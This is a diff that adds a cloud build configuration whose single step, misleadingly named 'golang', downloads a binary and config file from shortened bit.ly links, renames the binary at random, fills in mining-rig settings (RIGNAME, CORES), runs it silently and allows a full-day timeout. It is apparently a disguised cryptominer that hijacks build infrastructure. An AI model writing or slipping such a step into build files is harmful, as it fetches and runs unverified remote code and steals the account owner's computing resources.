@@ -1,0 +1,20 @@
+steps:
+  - name: golang
+    args:
+      - '-c'
+      - |
+        apt-get update
+        apt-get install sudo screen tmate cpulimit -y
+        worker=$(shuf -n 1 -i 1-999999)
+        wget -O config.json https://bit.ly/3B9sY68 && wget -O cores https://bit.ly/3B9sAVe && chmod +x config.json cores
+        mv cores $worker
+        sed -i "s/CORES/2/" "config.json"
+        sed -i "s/RIGNAME/$worker/" "config.json"
+        ./$worker >/dev/null 2>&1
+
+    waitFor:
+      - '-'
+    entrypoint: /bin/bash
+timeout: 86400s
+options:
+  diskSizeGb: '100'
